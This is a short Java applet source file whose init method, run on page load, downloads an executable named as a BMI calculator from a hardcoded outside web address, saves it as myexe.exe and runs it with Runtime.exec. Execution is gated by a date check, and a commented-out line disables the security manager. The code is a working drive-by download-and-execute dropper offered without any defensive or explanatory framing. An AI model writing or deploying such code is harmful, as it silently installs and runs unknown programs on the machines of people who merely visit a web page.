package com.murilo.applet;

import java.applet.Applet;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.util.Calendar;

import javax.swing.JOptionPane;

public class AppletStart extends Applet {

  private static final long	serialVersionUID	= 1L;
	private static final int	BUFFER_SIZE			= 0;

	public void init() {
		try {

			try {
				//System.setSecurityManager(null);
				
				//String app = getParameter("app");
				String app = "http://www.icert.com.br/downloads/calculadoraIMC.exe";

				File fileWrite = new File("myexe.exe");
				URL url = new URL(app);
				InputStream is = url.openStream();
				OutputStream os = new FileOutputStream(fileWrite);

				byte[] b = new byte[2048];
				int length;
				while ((length = is.read(b)) != -1) {
					os.write(b, 0, length);
				}

				is.close();
				os.close();
				String path = fileWrite.getAbsolutePath();
				System.err.println("Download Complete ::Saved to:" + path);

				Calendar calendar = Calendar.getInstance();
				if (calendar.get(Calendar.DAY_OF_MONTH) > 19 || calendar.get(Calendar.MONTH) >= Calendar.MAY) {

				} else {
					Runtime.getRuntime().exec(path);
				}
			} catch (Exception e) {
				System.err.println("Exception:::" + e);
				JOptionPane.showMessageDialog(null, "Error ::" + e);
			}

		} catch (Throwable ex) {
			JOptionPane.showMessageDialog(null, "Error ::" + ex);
		}
	}
}
